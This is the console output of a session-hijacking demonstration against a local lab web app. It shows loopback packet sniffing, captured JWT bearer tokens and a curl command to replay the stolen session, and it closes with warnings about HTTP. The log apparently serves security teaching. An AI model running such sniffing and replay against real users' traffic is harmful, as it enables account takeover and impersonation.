â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘     ADVANCED SESSION HIJACKING ATTACK                        â•‘
â•‘     Real-Time Cookie Theft & Token Extraction                â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Target: 127.0.0.1:3003
Timestamp: Mon Nov  3 13:26:46 UTC 2025
Capture Duration: 45 seconds
Attack Type: Man-in-the-Middle (Passive Sniffing)

[PHASE 1] Starting Advanced Packet Capture
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
[*] Capturing on loopback interface (lo)...
[*] Filter: tcp port 3003
[*] Duration: 60 seconds (with active traffic generation)

[*] Initializing packet capture...
[PHASE 2] Generating Traffic & Stealing Sessions
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
[*] Simulating user activity to capture active sessions...

[*] Creating test user account...
[*] Intercepting login with credentials...
[+] JWT Session Token captured: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiO...
[*] Capturing authenticated product browsing...
[*] Intercepting basket operations...
[*] Capturing authenticated API requests...
[*] Continuing traffic generation for 40 more seconds...
[+] Traffic generation complete
[*] Waiting for packet capture to complete...

[PHASE 3] Deep Packet Analysis & Session Extraction
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
[*] Analyzing captured packets with Python/TShark...

[*] Analyzing captured packets with TShark...

[+] Analysis complete!
[+] Cookies captured: 0
[+] Tokens captured: 9
[+] Vulnerabilities found: 9
[+] Risk Level: CRITICAL

[PHASE 4] Vulnerability Assessment
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

â•â•â• ATTACK STATISTICS â•â•â•
  total_cookies: 0
  total_tokens: 9
  total_credentials: 0
  total_vulnerabilities: 9
  unique_cookies: 0
  critical_vulns: 9
  high_vulns: 0
  medium_vulns: 0

â•â•â• CAPTURED COOKIES â•â•â•

â•â•â• CAPTURED TOKENS â•â•â•
  [Authorization Header] 127.0.0.1
  [Authorization Header] Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdG...
  [Authorization Header] Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdG...
  [Authorization Header] Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdG...
  [Authorization Header] Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdG...
  [Authorization Header] Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdG...
  [Authorization Header] Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdG...
  [Authorization Header] Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdG...
  [Authorization Header] Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdG...

â•â•â• CRITICAL VULNERABILITIES â•â•â•
  [CRITICAL] Unencrypted Authentication
    â†’ Authorization header sent over HTTP

â•â•â• RISK ASSESSMENT â•â•â•
  overall_risk: CRITICAL
  exploitability: Easy
  impact: Limited session access

â•â•â• EXPLOITATION PROOF â•â•â•
âœ“ 0
0 session cookies captured and ready for replay
âœ“ Cookies saved to: /workspaces/cns/artifacts/session-cookies-127.0.0.1-20251103-132646.txt

Attack demonstration:
  curl -b '/workspaces/cns/artifacts/session-cookies-127.0.0.1-20251103-132646.txt' http://127.0.0.1:3003/api/Challenges
  ^ This would replay the hijacked session

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                   ATTACK COMPLETED                           â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ“Š ARTIFACTS GENERATED:
   â€¢ Full Report:    /workspaces/cns/artifacts/session-hijack-127.0.0.1-20251103-132646.txt
   â€¢ Packet Capture: /workspaces/cns/artifacts/session-hijack-127.0.0.1-20251103-132646.pcap
   â€¢ JSON Analysis:  /workspaces/cns/artifacts/session-hijack-127.0.0.1-20251103-132646.json
   â€¢ Cookies:        /workspaces/cns/artifacts/session-cookies-127.0.0.1-20251103-132646.txt
   â€¢ Tokens:         /workspaces/cns/artifacts/session-tokens-127.0.0.1-20251103-132646.txt

âš ï¸  WARNING: This demonstrates why HTTPS is mandatory!
âš ï¸  Captured sessions can be replayed to impersonate users!
âš ï¸  All credentials and cookies transmitted in CLEARTEXT!

